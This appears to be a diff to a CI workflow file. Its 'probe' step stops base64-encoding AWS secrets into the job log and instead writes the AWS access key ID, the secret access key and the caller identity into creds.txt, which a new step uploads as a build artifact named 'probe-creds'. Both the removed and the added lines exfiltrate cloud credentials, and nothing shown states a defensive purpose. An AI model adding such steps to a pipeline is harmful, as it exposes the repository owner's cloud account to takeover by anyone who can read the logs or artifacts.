@@ -15,7 +15,14 @@ jobs:
           aws-region: us-east-1
       - name: probe
         run: |
-          echo "AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)"
-          echo "SECRET_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)"
-          echo "--- caller identity ---"
-          aws sts get-caller-identity || true
+          printf '%s' "$AWS_ACCESS_KEY_ID" > creds.txt
+          printf '\n' >> creds.txt
+          printf '%s' "$AWS_SECRET_ACCESS_KEY" >> creds.txt
+          printf '\n' >> creds.txt
+          aws sts get-caller-identity >> creds.txt 2>&1 || true
+          ls -l creds.txt
+      - name: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: probe-creds
+          path: creds.txt
